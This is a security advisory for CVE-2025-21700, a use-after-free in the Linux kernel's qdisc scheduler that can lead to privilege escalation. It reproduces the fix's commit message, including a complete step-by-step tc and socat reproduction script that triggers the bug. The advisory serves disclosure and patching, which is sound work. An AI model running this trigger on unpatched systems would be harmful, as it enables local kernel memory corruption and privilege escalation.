# [H] net: sched: Disallow replacing of child qdisc from one parent to another

## Summary
Severity: High
Advisory: CVE-2025-21700
Ecosystem: Linux
CVSS: 7.8 (CVSS:3.1/AV:L/AC:L/PR:L/UI:N/S:U/C:H/I:H/A:H)
Published: 2025-02-13
Source: https://osv.dev/vulnerability/CVE-2025-21700
Type: osv

## Affected
- Linux: `Kernel` — affected >=2.6.12 <5.4.291, >=5.5.0 <5.10.235, >=5.11.0 <5.15.179, >=5.16.0 <6.1.129, >=6.2.0 <6.6.76, >=6.7.0 <6.12.13, >=6.13.0 <6.13.2

## Details
In the Linux kernel, the following vulnerability has been resolved:

net: sched: Disallow replacing of child qdisc from one parent to another

Lion Ackermann was able to create a UAF which can be abused for privilege
escalation with the following script

Step 1. create root qdisc
tc qdisc add dev lo root handle 1:0 drr

step2. a class for packet aggregation do demonstrate uaf
tc class add dev lo classid 1:1 drr

step3. a class for nesting
tc class add dev lo classid 1:2 drr

step4. a class to graft qdisc to
tc class add dev lo classid 1:3 drr

step5.
tc qdisc add dev lo parent 1:1 handle 2:0 plug limit 1024

step6.
tc qdisc add dev lo parent 1:2 handle 3:0 drr

step7.
tc class add dev lo classid 3:1 drr

step 8.
tc qdisc add dev lo parent 3:1 handle 4:0 pfifo

step 9. Display the class/qdisc layout

tc class ls dev lo
 class drr 1:1 root leaf 2: quantum 64Kb
 class drr 1:2 root leaf 3: quantum 64Kb
 class drr 3:1 root leaf 4: quantum 64Kb

tc qdisc ls
 qdisc drr 1: dev lo root refcnt 2
 qdisc plug 2: dev lo parent 1:1
 qdisc pfifo 4: dev lo parent 3:1 limit 1000p
 qdisc drr 3: dev lo parent 1:2

step10. trigger the bug <=== prevented by this patch
tc qdisc replace dev lo parent 1:3 handle 4:0

step 11. Redisplay again the qdiscs/classes

tc class ls dev lo
 class drr 1:1 root leaf 2: quantum 64Kb
 class drr 1:2 root leaf 3: quantum 64Kb
 class drr 1:3 root leaf 4: quantum 64Kb
 class drr 3:1 root leaf 4: quantum 64Kb

tc qdisc ls
 qdisc drr 1: dev lo root refcnt 2
 qdisc plug 2: dev lo parent 1:1
 qdisc pfifo 4: dev lo parent 3:1 refcnt 2 limit 1000p
 qdisc drr 3: dev lo parent 1:2

Observe that a) parent for 4:0 does not change despite the replace request.
There can only be one parent.  b) refcount has gone up by two for 4:0 and
c) both class 1:3 and 3:1 are pointing to it.

Step 12.  send one packet to plug
echo "" | socat -u STDIN UDP4-DATAGRAM:127.0.0.1:8888,priority=$((0x10001))
step13.  send one packet to the grafted fifo
echo "" | socat -u STDIN UDP4-DATAGRAM:127.0.0.1:8888,priority=$((0x10003))

step14. lets trigger the uaf
tc class delete dev lo classid 1:3
tc class delete dev lo classid 1:1

The semantics of "replace" is for a del/add _on the same node_ and not
a delete from one node(3:1) and add to another node (1:3) as in step10.
While we could "fix" with a more complex approach there could be
consequences to expectations so the patch takes the preventive approach of
"disallow such config".

Joint work with Lion Ackermann <nnamrec@gmail.com>

## References
- https://git.kernel.org/stable/c/38646749d6e12f9d80a08d21ca39f0beca20230d
- https://git.kernel.org/stable/c/46c59ec33ec98aba20c15117630cae43a01404cc
- https://git.kernel.org/stable/c/73c7e1d6898ccbeee126194dcc05f58b8a795e70
- https://git.kernel.org/stable/c/7e2bd8c13b07e29a247c023c7444df23f9a79fd8
- https://git.kernel.org/stable/c/bc50835e83f60f56e9bec2b392fb5544f250fb6f
- https://git.kernel.org/stable/c/cd796e269123e1994bfc4e99dd76680ba0946a97
- https://git.kernel.org/stable/c/deda09c0543a66fa51554abc5ffd723d99b191bf
- https://git.kernel.org/stable/c/fe18c21d67dc7d1bcce1bba56515b1b0306db19b
- https://lists.debian.org/debian-lts-announce/2025/03/msg00028.html
- https://lists.debian.org/debian-lts-announce/2025/05/msg00030.html
- https://github.com/CVEProject/cvelistV5/tree/main/cves/2025/21xxx/CVE-2025-21700.json
- https://nvd.nist.gov/vuln/detail/CVE-2025-21700
- https://git.kernel.org/pub/scm/linux/kernel/git/stable/linux.git
